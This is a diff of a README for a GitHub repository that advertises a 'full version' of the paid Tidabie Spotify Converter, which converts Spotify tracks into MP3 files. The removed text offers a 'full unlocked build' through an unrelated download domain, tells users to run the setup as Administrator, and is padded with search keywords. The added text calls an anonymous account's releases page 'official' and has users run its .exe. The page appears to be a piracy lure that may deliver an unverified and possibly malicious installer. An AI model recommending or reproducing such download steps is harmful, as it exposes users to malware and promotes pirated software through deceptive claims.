@@ -1,73 +1,70 @@
-# Tidabie Spotify Converter — Full Version Download for Windows 11 & 10
+# 🎵 Tidabie-2026 - Save Spotify songs as local files
 
-**Tidabie-2026**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases)
 
-**Tidabie Spotify Converter** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+## 📋 Project Overview
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+Tidabie-2026 provides a way to save Spotify tracks, albums, and playlists to your local Windows computer. This software converts music files into standard formats like MP3, AAC, and WAV. Once you convert these tracks, you keep them on your hard drive. You can listen to your music offline without an internet connection. You own the files and can play them on any media player that supports these standard audio formats.
 
----
+## 💻 System Requirements
 
-## Download & Install
+Before you install this software, ensure your computer meets these requirements:
 
-> **This is the download page.** Use the button or link below to get **Tidabie Spotify Converter** for Windows.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: 1 GHz or faster.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 200 MB of free hard drive space.
+*   Internet Connection: Required to access Spotify and download the converter.
 
-<p align="center">
-  <a href="https://tidabie.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-Tidabie%20Spotify%20Converter-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Tidabie Spotify Converter">
-  </a>
-</p>
+## 🚀 Downloading the Software
 
-| | |
-| --- | --- |
-| **Direct link** | **[tidabie.nexustool.fun](https://tidabie.nexustool.fun/)** |
-| **Full URL** | `https://tidabie.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1.  Visit the official release page: [https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases](https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases).
+2.  Look for the latest version at the top of the page.
+3.  Click the file ending in ".exe" to begin the download.
+4.  Save the file to your "Downloads" folder.
 
-### Quick steps
+## 🛠️ Installation Instructions
 
-1. Click **[Download — tidabie.nexustool.fun](https://tidabie.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+1.  Open your "Downloads" folder.
+2.  Double-click the file named "Tidabie-2026-Setup.exe".
+3.  Follow the prompts on the screen.
+4.  Accept the license agreement when asked.
+5.  Choose your installation path or leave it as the default folder.
+6.  Click "Install" to start the process.
+7.  Wait for the progress bar to finish.
+8.  Select "Finish" to launch the program for the first time.
 
-<p align="center"><a href="https://tidabie.nexustool.fun/"><strong>⬇ Download Tidabie Spotify Converter now</strong></a></p>
+## 🎼 Using the Converter
 
----
+1.  Open Tidabie-2026 from your desktop shortcut or Windows Start menu.
+2.  Log in to your Spotify account through the integrated web player window.
+3.  Navigate to the song, artist, or playlist you want to save.
+4.  Click the "Add" button to load the music into the converter list. 
+5.  Select the output format you prefer from the settings menu. Common choices include MP3 or WAV.
+6.  Click the "Convert" button. 
+7.  The software saves the files to your specified output folder.
+8.  Open your output folder to find your tracks formatted as audio files.
 
-## About Tidabie Spotify Converter
+## ⚙️ Customizing Settings
 
-**Tidabie Spotify Converter** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+You can change how the software works by opening the "Settings" menu. You can set the output folder to a location of your choice, such as a music library folder or an external hard drive. You can also adjust the sound quality settings. A higher bitrate creates a larger file but ensures better audio fidelity. We suggest choosing 320kbps for the best balance of quality and file size.
 
-**Common searches:** tidabie spotify converter download spotify songs mp3, tidabie spotify converter spotify playlist offline windows, tidabie spotify converter spotify to mp3 converter pc 2026
+## 💡 Frequently Asked Questions
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+**Does the software require a Spotify subscription?**
+The software is compatible with both free and subscription accounts.
 
-**Repository:** `Tidabie-2026`
+**Where do my music files go?**
+The software saves files in the destination folder defined in your settings. If you do not change this, check the "Music" folder in your Windows profile.
 
-## Install (full version)
+**Can I move these files to my phone?**
+Yes. You can copy these MP3 files to any device that plays digital music. Connect your device to your computer via USB, then drag and drop the files onto your device storage.
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+**Does the program slow down my computer?**
+The software requires minimal system resources during use. You can continue to use other programs while the conversion runs in the background.
 
-## System requirements
+## 🛡️ Privacy and Safety
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+This software runs locally on your machine. We do not store your Spotify credentials on external servers. All conversion happens within the application on your computer. Keep your software updated by checking the GitHub release page regularly for newer versions.
 
----
-
-**Topics:** tidabie-spotify-converter-download-spotify-songs-m, tidabie, spotify, converter, mp3, tidabie-spotify-converter-spotify-playlist-offline, playlist, offline, tidabie-2026, tidabie-spotify-converter, spotify-converter, music-downloader
+Keywords: complete-version, converter, download, full-installer, mp3, mp3-converter, music-downloader, offline, offline-music, playlist, software, spotify, spotify-converter, tidabie, tidabie-2026, tidabie-spotify-converter, tidabie-spotify-converter-download-spotify-songs-m, tidabie-spotify-converter-spotify-playlist-offline, windows-11, windows-software
